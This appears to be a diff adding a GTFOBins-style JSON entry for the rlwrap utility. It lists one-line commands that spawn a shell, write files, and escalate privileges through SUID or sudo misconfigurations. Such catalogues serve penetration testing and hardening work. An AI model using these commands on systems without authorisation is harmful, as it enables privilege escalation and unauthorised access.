@@ -1,0 +1,25 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "code": "rlwrap /bin/sh"
+      }
+    ],
+    "file-write": [
+      {
+        "description": "This adds timestamps to the output file. This relies on the external 'echo' command.",
+        "code": "rlwrap -l [file] echo DATA\n"
+      }
+    ],
+    "suid": [
+      {
+        "code": "./rlwrap -H /dev/null /bin/sh -p"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo rlwrap /bin/sh"
+      }
+    ]
+  }
+}
